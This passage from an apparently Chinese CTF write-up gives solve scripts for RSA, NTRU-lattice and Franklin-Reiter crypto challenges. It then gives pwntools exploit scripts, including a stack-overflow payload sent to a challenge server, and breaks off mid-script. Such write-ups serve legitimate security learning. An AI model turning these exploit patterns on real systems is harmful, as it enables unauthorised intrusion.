<span class="n">c2</span><span class="o">=</span> <span class="mi">11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021</span>

</pre></td></tr></tbody></table></code></div></div>

<div class="language-text highlighter-rouge"><div class="code-header">
        <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>变形题 gcd(e1,e2)!=1

假设gcd(e1,e2)=x

(c1^s1*c2^s2)%n==m1^x%n

m=m1^x%n

m = m1^x+kn

e1e2不互素
</pre></td></tr></tbody></table></code></div></div>

<p>解题</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre><span class="c1">#user:mumu666
</span><span class="kn">from</span> <span class="n">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>   
<span class="n">e1</span><span class="o">=</span><span class="mi">55</span>
<span class="n">e2</span><span class="o">=</span><span class="mi">200</span>

<span class="n">n</span><span class="o">=</span> <span class="mi">19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023</span>
<span class="n">c1</span><span class="o">=</span> <span class="mi">276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529</span>
<span class="n">c2</span><span class="o">=</span> <span class="mi">11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021</span>


<span class="kn">import</span> <span class="n">gmpy2</span>
<span class="kn">import</span> <span class="n">libnum</span>

<span class="n">_</span><span class="p">,</span><span class="n">s1</span><span class="p">,</span><span class="n">s2</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="nf">gcdext</span><span class="p">(</span><span class="n">e1</span><span class="p">,</span><span class="n">e2</span><span class="p">)</span>
<span class="n">m1</span> <span class="o">=</span> <span class="p">(</span><span class="nf">pow</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span><span class="n">s1</span><span class="p">,</span><span class="n">n</span><span class="p">)</span><span class="o">*</span><span class="nf">pow</span><span class="p">(</span><span class="n">c2</span><span class="p">,</span><span class="n">s2</span><span class="p">,</span><span class="n">n</span><span class="p">))</span><span class="o">%</span><span class="n">n</span>
<span class="nf">print</span><span class="p">(</span><span class="n">m1</span><span class="p">)</span>

<span class="n">x</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="nf">gcd</span><span class="p">(</span><span class="n">e1</span><span class="p">,</span><span class="n">e2</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">k</span><span class="o">=</span><span class="mi">0</span>
<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">m11</span> <span class="o">=</span> <span class="n">m1</span><span class="o">+</span><span class="n">k</span><span class="o">*</span><span class="n">n</span>
    <span class="n">m</span><span class="p">,</span><span class="n">s</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="nf">iroot</span><span class="p">(</span><span class="n">m11</span><span class="p">,</span><span class="n">x</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">s</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">libnum</span><span class="p">.</span><span class="nf">n2s</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">m</span><span class="p">)))</span>
        <span class="k">break</span>
    <span class="n">k</span><span class="o">+=</span><span class="mi">1</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h3 id="easylattice"><span class="me-2">easyLattice</span><a href="#easylattice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>题目附件</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">secret</span> <span class="kn">import</span> <span class="n">flag</span>
<span class="kn">import</span> <span class="n">gmpy2</span>

<span class="k">assert</span> <span class="nf">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">==</span> <span class="mi">47</span>

<span class="n">f</span> <span class="o">=</span> <span class="nf">bytes_to_long</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="nf">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
<span class="n">g</span> <span class="o">=</span> <span class="nf">getPrime</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
<span class="n">h</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="nf">invert</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="o">*</span> <span class="n">g</span> <span class="o">%</span> <span class="n">p</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">h =</span><span class="sh">'</span><span class="p">,</span> <span class="n">h</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">p =</span><span class="sh">'</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>

<span class="sh">"""</span><span class="s">
h = 9848463356094730516607732957888686710609147955724620108704251779566910519170690198684628685762596232124613115691882688827918489297122319416081019121038443
p = 11403618200995593428747663693860532026261161211931726381922677499906885834766955987247477478421850280928508004160386000301268285541073474589048412962888947   
</span><span class="sh">"""</span>
</pre></td></tr></tbody></table></code></div></div>

<p>NTRU格密码</p>

<p>参考链接</p>

<p>https://www.cnblogs.com/sCh3n/p/15917388.html</p>

<p>解题</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">h</span> <span class="o">=</span> <span class="mi">9848463356094730516607732957888686710609147955724620108704251779566910519170690198684628685762596232124613115691882688827918489297122319416081019121038443</span>
<span class="n">p</span> <span class="o">=</span> <span class="mi">11403618200995593428747663693860532026261161211931726381922677499906885834766955987247477478421850280928508004160386000301268285541073474589048412962888947</span> <span class="err"> </span> <span class="err"> </span> 
<span class="c1">#f=1427527382696592338597148457263770558761219491396746016810215766179780194787443388228681575452119269880711319897410623591
</span><span class="n">L</span> <span class="o">=</span> <span class="nc">Matrix</span><span class="p">(</span><span class="n">ZZ</span><span class="p">,</span> <span class="p">[[</span><span class="mi">1</span><span class="p">,</span> <span class="n">h</span><span class="o">*</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">250</span><span class="p">)],</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="n">p</span><span class="o">*</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">250</span><span class="p">)]])</span>

<span class="n">f</span><span class="p">,</span> <span class="n">g</span> <span class="o">=</span> <span class="n">L</span><span class="p">.</span><span class="nc">LLL</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
<span class="nf">print</span><span class="p">(</span><span class="nf">long_to_bytes</span><span class="p">(</span><span class="o">-</span><span class="n">f</span><span class="p">))</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h3 id="gggcccddd"><span class="me-2">gggcccddd</span><a href="#gggcccddd" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>题目附件</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">enc</span> <span class="kn">import</span> <span class="n">flag</span>

<span class="n">m</span> <span class="o">=</span> <span class="nf">bytes_to_long</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="nf">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
<span class="n">q</span> <span class="o">=</span> <span class="nf">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
<span class="n">n</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span>
<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
<span class="n">c1</span> <span class="o">=</span> <span class="nf">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
<span class="n">c2</span> <span class="o">=</span> <span class="nf">pow</span><span class="p">(</span><span class="mi">233</span><span class="o">*</span><span class="n">m</span><span class="o">+</span><span class="mi">9527</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">n = </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">c1 = </span><span class="si">{</span><span class="n">c1</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">c2 = </span><span class="si">{</span><span class="n">c2</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">e = </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
<span class="sh">"""</span><span class="s">
n = 71451784354488078832557440841067139887532820867160946146462765529262021756492415597759437645000198746438846066445835108438656317936511838198860210224738728502558420706947533544863428802654736970469313030584334133519644746498781461927762736769115933249195917207059297145965502955615599481575507738939188415191
c1 = 60237305053182363686066000860755970543119549460585763366760183023969060529797821398451174145816154329258405143693872729068255155086734217883658806494371105889752598709446068159151166250635558774937924668506271624373871952982906459509904548833567117402267826477728367928385137857800256270428537882088110496684
c2 = 20563562448902136824882636468952895180253983449339226954738399163341332272571882209784996486250189912121870946577915881638415484043534161071782387358993712918678787398065688999810734189213904693514519594955522460151769479515323049821940285408228055771349670919587560952548876796252634104926367078177733076253
e = 65537
</span><span class="sh">"""</span>
</pre></td></tr></tbody></table></code></div></div>

<p>franklin-Reiter相关消息攻击</p>

<p>参考链接</p>

<p>https://blog.csdn.net/XiongSiqi_blog/article/details/130978226?spm=1001.2014.3001.5502</p>

<p>解题</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">n</span> <span class="o">=</span> <span class="mi">71451784354488078832557440841067139887532820867160946146462765529262021756492415597759437645000198746438846066445835108438656317936511838198860210224738728502558420706947533544863428802654736970469313030584334133519644746498781461927762736769115933249195917207059297145965502955615599481575507738939188415191</span>
<span class="n">c1</span> <span class="o">=</span> <span class="mi">60237305053182363686066000860755970543119549460585763366760183023969060529797821398451174145816154329258405143693872729068255155086734217883658806494371105889752598709446068159151166250635558774937924668506271624373871952982906459509904548833567117402267826477728367928385137857800256270428537882088110496684</span>
<span class="n">c2</span> <span class="o">=</span> <span class="mi">20563562448902136824882636468952895180253983449339226954738399163341332272571882209784996486250189912121870946577915881638415484043534161071782387358993712918678787398065688999810734189213904693514519594955522460151769479515323049821940285408228055771349670919587560952548876796252634104926367078177733076253</span>
<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
<span class="k">def</span> <span class="nf">attack</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="n">c2</span><span class="p">):</span>
    <span class="n">PR</span><span class="p">.</span><span class="o">&lt;</span><span class="n">x</span><span class="o">&gt;=</span><span class="nc">PolynomialRing</span><span class="p">(</span><span class="nc">Zmod</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
    <span class="n">g1</span> <span class="o">=</span> <span class="n">x</span><span class="o">^</span><span class="n">e</span> <span class="o">-</span> <span class="n">c1</span>
    <span class="n">g2</span> <span class="o">=</span> <span class="p">(</span><span class="mi">233</span><span class="o">*</span><span class="n">x</span><span class="o">+</span><span class="mi">9527</span><span class="p">)</span><span class="o">^</span><span class="n">e</span> <span class="o">-</span> <span class="n">c2</span>

    <span class="k">def</span> <span class="nf">gcd</span><span class="p">(</span><span class="n">g1</span><span class="p">,</span> <span class="n">g2</span><span class="p">):</span>
        <span class="k">while</span> <span class="n">g2</span><span class="p">:</span>
            <span class="n">g1</span><span class="p">,</span> <span class="n">g2</span> <span class="o">=</span> <span class="n">g2</span><span class="p">,</span> <span class="n">g1</span> <span class="o">%</span> <span class="n">g2</span>
            <span class="nf">if</span><span class="p">(</span><span class="n">g2</span><span class="p">.</span><span class="nf">degree</span><span class="p">()</span> <span class="o">%</span> <span class="mi">100</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
                <span class="nf">print</span><span class="p">(</span><span class="n">g2</span><span class="p">.</span><span class="nf">degree</span><span class="p">())</span>
        <span class="k">return</span> <span class="n">g1</span><span class="p">.</span><span class="nf">monic</span><span class="p">()</span>
    <span class="k">return</span> <span class="o">-</span><span class="nf">gcd</span><span class="p">(</span><span class="n">g1</span><span class="p">,</span> <span class="n">g2</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">m1</span> <span class="o">=</span> <span class="nf">attack</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="n">c2</span><span class="p">)</span>
<span class="n">flag</span> <span class="o">=</span> <span class="nf">long_to_bytes</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">m1</span><span class="p">))</span>
<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="pwn"><span class="me-2">Pwn</span><a href="#pwn" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>基本贴的都是脚本，没详解</li>
</ul>

<p>‍</p>

<h3 id="签到stack"><span class="me-2">[签到]stack</span><a href="#签到stack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">binary</span> <span class="o">=</span> <span class="sh">''</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">);</span><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">yuanshen.life</span><span class="sh">'</span><span class="p">,</span><span class="mi">33275</span><span class="p">)</span>
<span class="c1">#io = process('./pwn')
</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mh">0x230</span><span class="p">))</span>
<span class="c1">#gdb.attach(io)
</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">command: </span><span class="sh">'</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">cat flag</span><span class="sh">'</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x04011F7</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>


<span class="c1">#gdb.attach(io,gdbscript)
</span>
<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h3 id="-进阶talkboom-"><span class="me-2">(🩸) [进阶]TalkBoom ()</span><a href="#-进阶talkboom-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>获取可以 执行到 <code class="language-plaintext highlighter-rouge">mov edi,0x100</code>​ 的 token 吧</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">elftools.elf.elffile</span> <span class="kn">import</span> <span class="n">ELFFile</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf_filename</span>  <span class="o">=</span> <span class="sh">'</span><span class="s">./SphinxBomb1</span><span class="sh">'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">elf_filename</span><span class="p">)</span>
<span class="n">function_address</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span>
<span class="c1">#print(function_address)
</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">function_address</span><span class="p">:</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">main</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span>
        <span class="n">backdoor</span>  <span class="o">=</span> <span class="n">function_address</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        <span class="n">bd_name</span> <span class="o">=</span> <span class="n">i</span>
        <span class="k">break</span>
<span class="c1">#cross_references = []
#function_name = bd_name
</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">main:</span><span class="sh">"</span><span class="p">,</span><span class="nf">hex</span><span class="p">(</span><span class="n">backdoor</span><span class="p">))</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">name:</span><span class="sh">"</span><span class="p">,</span><span class="n">bd_name</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">find_mov_instructions</span><span class="p">(</span><span class="n">elf_filename</span><span class="p">,</span> <span class="n">start_address</span><span class="p">,</span> <span class="n">end_address</span><span class="p">):</span>
    <span class="n">mov_addresses</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">elf_filename</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">elffile</span> <span class="o">=</span> <span class="nc">ELFFile</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>

        <span class="c1"># 遍历所有节
</span>        <span class="k">for</span> <span class="n">section</span> <span class="ow">in</span> <span class="n">elffile</span><span class="p">.</span><span class="nf">iter_sections</span><span class="p">():</span>
            <span class="c1"># 只查找可执行节
</span>            <span class="k">if</span> <span class="n">section</span><span class="p">.</span><span class="n">header</span><span class="p">[</span><span class="sh">'</span><span class="s">sh_type</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="sh">'</span><span class="s">SHT_PROGBITS</span><span class="sh">'</span><span class="p">:</span>
